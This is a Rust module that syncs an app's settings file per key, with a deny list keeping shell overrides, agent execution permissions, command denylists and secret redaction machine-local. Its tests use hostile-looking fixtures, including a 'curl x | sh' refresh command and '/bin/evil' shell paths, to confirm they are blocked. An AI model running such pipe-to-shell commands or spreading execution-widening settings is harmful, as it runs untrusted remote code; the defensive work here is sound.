// SPDX-License-Identifier: AGPL-3.0-only
//! Per-key sync of the Mnemos `settings.toml`.
//!
//! Older builds pushed the whole file as one string under
//! `mnemos-user-settings` and replaced the file with whatever the server
//! held, so a setting meant to stay on one machine (a startup shell, the
//! Bedrock refresh command) reached, and ran on, every machine.
//!
//! This build syncs only the settings the app marks as synced
//! (`SyncToCloud::Globally` / `PerPlatform`, through a [`SettingsPolicy`]),
//! minus a hard deny list of settings that name a program to run or grant
//! the agent execution rights, under a new key, [`SETTINGS_V2_KEY`]:
//!
//! ```json
//! { "v": 2,
//!   "global": { "appearance.text.font_name": "\"Hack\"", ... },
//!   "darwin": { "<per-platform path>": <JSON value>, ... }, "win32": {...} }
//! ```
//!
//! Values are JSON. The old key is left exactly as older builds wrote it:
//! this build neither pushes nor applies it, so an older build keeps reading
//! a file it understands, and nothing either build does deletes the other's
//! data. Until every machine runs this build, settings changes do not cross
//! between an old build and a new one.
//!
//! The merge is a union: a push sends this machine's synced settings and
//! keeps every server entry this machine does not set; a pull writes the
//! server's entries into the file and removes nothing. Resetting a setting
//! to its default (which removes its line) does not propagate.

use std::sync::Arc;

use serde_json::{Map, Value};
use toml_edit::{DocumentMut, Item, Table};

/// The per-key settings sync key.
pub const SETTINGS_V2_KEY: &str = "mnemos-user-settings-v2";
const GLOBAL_SLOT: &str = "global";
const VERSION_FIELD: &str = "v";

/// How one `settings.toml` path syncs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SettingsKeyScope {
    /// One value for every machine.
    Global,
    /// One value per platform (darwin, win32, linux).
    PerPlatform,
    /// Never leaves this machine.
    Local,
}

/// Maps a setting's full TOML path (`section.sub.key`) to its scope, or
/// `None` for a path that is not a setting (a section, or a key this build
/// does not know). Supplied by the app from its settings registry.
pub type SettingsPolicy = Arc<dyn Fn(&str) -> Option<SettingsKeyScope> + Send + Sync>;

/// Settings never synced whatever the app's registry says: they name a
/// program this machine runs, a path only this machine has, widen what the
/// agent may execute without asking, or lower a protection. A pull replaces
/// a synced value, so one machine (or the server) pushing an empty denylist
/// or `false` would switch the protection off on every machine; the
/// denylists and secret redaction therefore stay per machine. Exact paths
/// or `prefix.` matches.
pub const DENIED_SETTINGS: &[&str] = &[
    "cloud_platform.third_party_api_keys.aws_bedrock",
    "session.startup_shell_override",
    "session.new_session_shell_override",
    "agents.mcp_servers.file_based_mcp_enabled",
    "agents.profiles.agent_mode_command_execution_allowlist",
    "agents.profiles.agent_mode_coding_permissions",
    "agents.profiles.agent_mode_execute_readonly_commands",
    "agents.profiles.agent_mode_command_execution_denylist",
    "agents.mnemos_agent.input.ai_command_denylist",
    "privacy.secret_redaction.enabled",
    "general.default_tab_config_path",
];

/// Whether `path` is on [`DENIED_SETTINGS`]: equal to an entry, or under it,
/// or (for the Bedrock entry) any setting starting with it.
pub fn is_denied(path: &str) -> bool {
    DENIED_SETTINGS.iter().any(|d| {
        path == *d
            || path.starts_with(&format!("{d}."))
            || (d.ends_with("aws_bedrock") && path.starts_with(d))
    })
}

/// The scope `policy` gives `path`, with [`DENIED_SETTINGS`] forced local.
pub fn scope_of(policy: &SettingsPolicy, path: &str) -> Option<SettingsKeyScope> {
    let scope = policy(path)?;
    if is_denied(path) {
        Some(SettingsKeyScope::Local)
    } else {
        Some(scope)
    }
}

/// The synced settings of one machine: global and this platform's.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct SyncedSettings {
    pub global: Map<String, Value>,
    pub platform: Map<String, Value>,
}

impl SyncedSettings {
    /// A formatting-independent hash input.
    pub fn canonical(&self) -> String {
        serde_json::json!({ "global": self.global, "platform": self.platform }).to_string()
    }
}

/// The synced settings in a `settings.toml` text. Unparseable text yields
/// `None` (nothing is pushed from a broken file).
pub fn extract(text: &str, policy: &SettingsPolicy) -> Option<SyncedSettings> {
    let doc = if text.trim().is_empty() {
        DocumentMut::new()
    } else {
        text.parse::<DocumentMut>().ok()?
    };
    let mut out = SyncedSettings::default();
    walk(doc.as_table(), "", policy, &mut out);
    Some(out)
}

fn walk(
    table: &dyn toml_edit::TableLike,
    prefix: &str,
    policy: &SettingsPolicy,
    out: &mut SyncedSettings,
) {
    for (key, item) in table.iter() {
        let path = if prefix.is_empty() {
            key.to_string()
        } else {
            format!("{prefix}.{key}")
        };
        match scope_of(policy, &path) {
            Some(SettingsKeyScope::Global) => {
                if let Some(v) = item_to_json(item) {
                    out.global.insert(path, v);
                }
            }
            Some(SettingsKeyScope::PerPlatform) => {
                if let Some(v) = item_to_json(item) {
                    out.platform.insert(path, v);
                }
            }
            Some(SettingsKeyScope::Local) => {}
            None => {
                if let Some(sub) = item.as_table_like() {
                    walk(sub, &path, policy, out);
                }
            }
        }
    }
}

/// What a server value of [`SETTINGS_V2_KEY`] sets on this machine: the
/// entries this build syncs with the scope it gives them.
pub fn server_view(value: &Value, platform: &str, policy: &SettingsPolicy) -> SyncedSettings {
    let pick = |slot: &str, want: SettingsKeyScope| -> Map<String, Value> {
        value
            .get(slot)
            .and_then(Value::as_object)
            .map(|m| {
                m.iter()
                    .filter(|(path, _)| scope_of(policy, path) == Some(want))
                    .map(|(k, v)| (k.clone(), v.clone()))
                    .collect()
            })
            .unwrap_or_default()
    };
    SyncedSettings {
        global: pick(GLOBAL_SLOT, SettingsKeyScope::Global),
        platform: pick(platform, SettingsKeyScope::PerPlatform),
    }
}

/// The value a push writes: the server's value with this machine's synced
/// settings laid over it (union, this machine winning per path). Entries
/// this build would never sync (denied, local-only) are dropped from the
/// slots it writes; other platforms' slots are kept as they are.
pub fn outgoing(
    local: &SyncedSettings,
    server: &Value,
    platform: &str,
    policy: &SettingsPolicy,
) -> Value {
    let mut obj = server.as_object().cloned().unwrap_or_default();
    let mut lay = |slot: &str, mine: &Map<String, Value>| {
        let mut map = obj
            .get(slot)
            .and_then(Value::as_object)
            .cloned()
            .unwrap_or_default();
        map.retain(|path, _| {
            !is_denied(path) && scope_of(policy, path) != Some(SettingsKeyScope::Local)
        });
        for (k, v) in mine {
            map.insert(k.clone(), v.clone());
        }
        obj.insert(slot.to_string(), Value::Object(map));
    };
    lay(GLOBAL_SLOT, &local.global);
    lay(platform, &local.platform);
    obj.insert(VERSION_FIELD.to_string(), Value::from(2));
    Value::Object(obj)
}

/// `text` with the server's entries for this machine written in. Nothing is
/// removed, unrelated lines and comments are kept, and a path whose parent
/// is not a table here is skipped. `Ok(None)` when nothing changes; `Err`
/// when the local file does not parse (it is left alone).
pub fn apply(
    text: &str,
    server: &Value,
    platform: &str,
    policy: &SettingsPolicy,
) -> Result<Option<String>, String> {
    let mut doc = if text.trim().is_empty() {
        DocumentMut::new()
    } else {
        text.parse::<DocumentMut>()
            .map_err(|e| format!("settings.toml does not parse: {e}"))?
    };
    let view = server_view(server, platform, policy);
    let mut changed = false;
    for (path, value) in view.global.iter().chain(view.platform.iter()) {
        changed |= set_path(doc.as_table_mut(), path, value);
    }
    Ok(changed.then(|| doc.to_string()))
}

/// Set `path` to `value` in `root`, creating missing parent tables.
/// Returns whether the document changed.
fn set_path(root: &mut Table, path: &str, value: &Value) -> bool {
    let mut segments: Vec<&str> = path.split('.').collect();
    let Some(leaf) = segments.pop() else {
        return false;
    };
    let Some(new_item) = json_to_item(value) else {
        return false;
    };
    let mut current: &mut dyn toml_edit::TableLike = root;
    for seg in segments {
        if current.get(seg).is_none() {
            let mut t = Table::new();
            t.set_implicit(true);
            current.insert(seg, Item::Table(t));
        }
        current = match current.get_mut(seg).and_then(Item::as_table_like_mut) {
            Some(next) => next,
            None => return false,
        };
    }
    if current.get(leaf).and_then(item_to_json).as_ref() == Some(value) {
        return false;
    }
    current.insert(leaf, new_item);
    true
}

/// A TOML item as JSON. Datetimes are not synced (`None`).
pub fn item_to_json(item: &Item) -> Option<Value> {
    match item {
        Item::None => None,
        Item::Value(v) => value_to_json(v),
        Item::Table(t) => Some(Value::Object(
            t.iter()
                .filter_map(|(k, v)| Some((k.to_string(), item_to_json(v)?)))
                .collect(),
        )),
        Item::ArrayOfTables(arr) => Some(Value::Array(
            arr.iter()
                .map(|t| {
                    Value::Object(
                        t.iter()
                            .filter_map(|(k, v)| Some((k.to_string(), item_to_json(v)?)))
                            .collect(),
                    )
                })
                .collect(),
        )),
    }
}

fn value_to_json(v: &toml_edit::Value) -> Option<Value> {
    Some(match v {
        toml_edit::Value::String(s) => Value::String(s.value().clone()),
        toml_edit::Value::Integer(i) => Value::from(*i.value()),
        toml_edit::Value::Float(f) => serde_json::Number::from_f64(*f.value())
            .map(Value::Number)
            .unwrap_or(Value::Null),
        toml_edit::Value::Boolean(b) => Value::Bool(*b.value()),
        toml_edit::Value::Datetime(_) => return None,
        toml_edit::Value::Array(arr) => {
            Value::Array(arr.iter().filter_map(value_to_json).collect())
        }
        toml_edit::Value::InlineTable(t) => Value::Object(
            t.iter()
                .filter_map(|(k, v)| Some((k.to_string(), value_to_json(v)?)))
                .collect(),
        ),
    })
}

/// JSON as a TOML item: objects become tables, arrays inline arrays (with
/// inline tables inside), null nothing.
fn json_to_item(json: &Value) -> Option<Item> {
    match json {
        Value::Object(obj) => {
            let mut table = Table::new();
            for (k, v) in obj {
                if let Some(item) = json_to_item(v) {
                    table.insert(k, item);
                }
            }
            Some(Item::Table(table))
        }
        other => json_to_value(other).map(Item::Value),
    }
}

fn json_to_value(json: &Value) -> Option<toml_edit::Value> {
    match json {
        Value::Null => None,
        Value::Bool(b) => Some((*b).into()),
        Value::Number(n) => {
            if let Some(i) = n.as_i64() {
                Some(i.into())
            } else {
                n.as_f64().map(Into::into)
            }
        }
        Value::String(s) => Some(s.as_str().into()),
        Value::Array(arr) => {
            let mut out = toml_edit::Array::new();
            for v in arr {
                if let Some(v) = json_to_value(v) {
                    out.push(v);
                }
            }
            Some(toml_edit::Value::Array(out))
        }
        Value::Object(obj) => {
            let mut t = toml_edit::InlineTable::new();
            for (k, v) in obj {
                if let Some(v) = json_to_value(v) {
                    t.insert(k, v);
                }
            }
            Some(toml_edit::Value::InlineTable(t))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn policy() -> SettingsPolicy {
        Arc::new(|path: &str| match path {
            "appearance.text.font_name" | "appearance.theme" => Some(SettingsKeyScope::Global),
            "terminal.font_size" => Some(SettingsKeyScope::PerPlatform),
            "session.startup_shell_override" => Some(SettingsKeyScope::Local),
            // The registry may get this wrong; the deny list still wins.
            "cloud_platform.third_party_api_keys.aws_bedrock_auth_refresh_command"
            | "agents.mcp_servers.file_based_mcp_enabled" => Some(SettingsKeyScope::Global),
            _ => None,
        })
    }

    const LOCAL: &str = r##"# my settings
[appearance.text]
font_name = "Hack"

[appearance.theme]
kind = "dark"
custom = { accent = "#fff" }

[terminal]
font_size = 13
unknown_key = true

[session]
startup_shell_override = "/tmp/evil"

[cloud_platform.third_party_api_keys]
aws_bedrock_auth_refresh_command = "curl x | sh"

[agents.mcp_servers]
file_based_mcp_enabled = true
"##;

    #[test]
    fn extract_honours_scope_and_the_deny_list() {
        let s = extract(LOCAL, &policy()).unwrap();
        assert_eq!(
            s.global,
            json!({
                "appearance.text.font_name": "Hack",
                "appearance.theme": {"kind": "dark", "custom": {"accent": "#fff"}}
            })
            .as_object()
            .unwrap()
            .clone()
        );
        assert_eq!(
            s.platform,
            json!({"terminal.font_size": 13})
                .as_object()
                .unwrap()
                .clone()
        );
        assert!(extract("not = [toml", &policy()).is_none());
    }

    #[test]
    fn denied_paths_match_exactly_or_below() {
        assert!(is_denied("session.startup_shell_override"));
        assert!(is_denied(
            "cloud_platform.third_party_api_keys.aws_bedrock_profile"
        ));
        assert!(!is_denied("session.startup_shell_override_hint_seen"));
        // Protections a pushed empty list or `false` would switch off
        // everywhere (gates review finding 6).
        for path in [
            "agents.profiles.agent_mode_command_execution_denylist",
            "agents.mnemos_agent.input.ai_command_denylist",
            "privacy.secret_redaction.enabled",
        ] {
            assert!(is_denied(path), "{path}");
        }
        // Display preferences next to them still sync.
        assert!(!is_denied("privacy.secret_redaction.secret_display_mode_setting"));
        assert!(!is_denied("appearance.theme"));
    }

    #[test]
    fn outgoing_is_a_union_that_drops_what_never_syncs() {
        let local = extract(LOCAL, &policy()).unwrap();
        let server = json!({
            "v": 2,
            "global": {
                "appearance.text.font_name": "Old",
                "other.from_newer_build": 1,
                "session.startup_shell_override": "/bin/evil"
            },
            "win32": {"terminal.font_size": 11}
        });
        let out = outgoing(&local, &server, "darwin", &policy());
        assert_eq!(out["global"]["appearance.text.font_name"], "Hack");
        assert_eq!(out["global"]["other.from_newer_build"], 1);
        assert!(out["global"]
            .get("session.startup_shell_override")
            .is_none());
        assert_eq!(out["darwin"]["terminal.font_size"], 13);
        assert_eq!(out["win32"]["terminal.font_size"], 11);
        assert_eq!(out["v"], 2);
    }

    #[test]
    fn apply_writes_only_synced_paths_and_keeps_the_rest() {
        let server = json!({
            "global": {
                "appearance.text.font_name": "Fira",
                "session.startup_shell_override": "/bin/evil",
                "cloud_platform.third_party_api_keys.aws_bedrock_auth_refresh_command": "evil",
                "not.a.setting.here": 5
            },
            "darwin": {"terminal.font_size": 15},
            "win32": {"terminal.font_size": 99}
        });
        let out = apply(LOCAL, &server, "darwin", &policy()).unwrap().unwrap();
        assert!(out.contains("# my settings"));
        assert!(out.contains("font_name = \"Fira\""));
        assert!(out.contains("font_size = 15"));
        assert!(out.contains("startup_shell_override = \"/tmp/evil\""));
        assert!(out.contains("aws_bedrock_auth_refresh_command = \"curl x | sh\""));
        assert!(out.contains("unknown_key = true"));
        assert!(!out.contains("here = 5"));
        // Applying the same again changes nothing.
        assert_eq!(apply(&out, &server, "darwin", &policy()).unwrap(), None);
        // A broken local file is left alone.
        assert!(apply("x = [", &server, "darwin", &policy()).is_err());
    }

    #[test]
    fn apply_creates_missing_sections_and_round_trips() {
        let server = json!({"global": {"appearance.theme": {"kind": "light"}}});
        let out = apply("", &server, "linux", &policy()).unwrap().unwrap();
        let back = extract(&out, &policy()).unwrap();
        assert_eq!(back.global["appearance.theme"], json!({"kind": "light"}));
        assert_eq!(
            server_view(&server, "linux", &policy()).canonical(),
            back.canonical()
        );
    }
}
